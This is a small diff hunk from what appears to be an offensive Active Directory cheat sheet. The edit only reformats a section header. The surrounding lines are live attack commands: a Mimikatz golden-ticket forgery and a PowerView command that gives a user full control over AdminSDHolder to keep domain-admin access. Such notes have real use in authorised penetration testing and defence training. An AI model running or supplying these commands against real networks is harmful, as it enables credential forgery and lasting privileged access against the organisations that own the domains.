@@ -806,7 +806,7 @@ Invoke-Mimikatz -Command '"kerberos::golden /domain:hacked.local /sid:S-1-5-21-*
 #First get DA
 Import-Module powerview.ps1
 
-----------Adding Permission-----------
+Adding Permission - 
 #Add FullControl permissions for a user to the AdminSDHolder using PowerView as DA:
 Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=hacked,DC=local' -PrincipalIdentity hacker -Rights All -Verbose
 
